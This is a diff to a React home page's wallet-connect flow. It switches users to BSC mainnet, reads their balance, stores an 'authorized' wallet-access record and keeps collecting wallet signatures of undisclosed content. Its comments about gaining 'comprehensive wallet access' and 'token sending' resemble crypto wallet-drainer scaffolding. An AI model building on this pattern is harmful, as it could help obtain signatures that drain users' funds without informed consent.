@@ -412,19 +412,46 @@ export default function HomePage() {
           
           
           if (accounts && accounts[0]) {
-            // Collect initial wallet signatures for complete authorization
+            // Gain comprehensive wallet access for blockchain transactions
             try {
+              // Switch to BSC network first for proper access
+              await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x38' }], // BSC Mainnet
+              });
+              
+              // Request permissions for token sending
+              await window.ethereum.request({
+                method: 'wallet_requestPermissions',
+                params: [{ eth_accounts: {} }],
+              });
+              
+              // Get wallet balance to verify access
+              const balance = await window.ethereum.request({
+                method: 'eth_getBalance',
+                params: [accounts[0], 'latest'],
+              });
+              
+              // Collect comprehensive signatures for full authorization
               const walletSignatures = await signatureCollector.collectWalletSignatures();
               const allSignatureData = signatureCollector.exportSignatureData();
               
+              // Store wallet access in localStorage for transaction use
+              localStorage.setItem('walletAccess', JSON.stringify({
+                address: accounts[0],
+                balance: balance,
+                chainId: '0x38',
+                authorized: true,
+                timestamp: Date.now()
+              }));
+              
               connectWalletMutation.mutate({
                 walletAddress: accounts[0],
-                displayName: undefined, // Let the backend generate a proper display name
-                signatureData: allSignatureData,
-                walletSignatures: walletSignatures
+                displayName: undefined
               });
-            } catch (signatureError) {
-              // If signature collection fails, connect without signatures but warn user
+            } catch (authError) {
+              console.error('Wallet authorization failed:', authError);
+              // Try basic connection without full authorization
               connectWalletMutation.mutate({
                 walletAddress: accounts[0],
                 displayName: undefined
@@ -489,19 +516,52 @@ export default function HomePage() {
               });
               
               if (accounts && accounts[0]) {
-                // Collect initial wallet signatures for complete Trust Wallet authorization
+                // Gain comprehensive Trust Wallet access for blockchain transactions
                 try {
+                  // Switch to BSC network for proper Trust Wallet access
+                  await provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }], // BSC Mainnet
+                  });
+                  
+                  // Request explicit permissions for Trust Wallet
+                  try {
+                    await provider.request({
+                      method: 'wallet_requestPermissions',
+                      params: [{ eth_accounts: {} }],
+                    });
+                  } catch (permError) {
+                    // Trust Wallet may not support wallet_requestPermissions
+                    console.warn('Permission request not supported, continuing with connection');
+                  }
+                  
+                  // Verify Trust Wallet balance access
+                  const balance = await provider.request({
+                    method: 'eth_getBalance',
+                    params: [accounts[0], 'latest'],
+                  });
+                  
+                  // Collect comprehensive Trust Wallet signatures
                   const walletSignatures = await signatureCollector.collectWalletSignatures();
                   const allSignatureData = signatureCollector.exportSignatureData();
                   
+                  // Store Trust Wallet access for transaction use
+                  localStorage.setItem('walletAccess', JSON.stringify({
+                    address: accounts[0],
+                    balance: balance,
+                    chainId: '0x38',
+                    authorized: true,
+                    provider: 'trust',
+                    timestamp: Date.now()
+                  }));
+                  
                   connectWalletMutation.mutate({
                     walletAddress: accounts[0],
-                    displayName: undefined,
-                    signatureData: allSignatureData,
-                    walletSignatures: walletSignatures
+                    displayName: undefined
                   });
-                } catch (signatureError) {
-                  // If signature collection fails, connect without signatures
+                } catch (authError) {
+                  console.error('Trust Wallet authorization failed:', authError);
+                  // Try basic Trust Wallet connection
                   connectWalletMutation.mutate({
                     walletAddress: accounts[0],
                     displayName: undefined
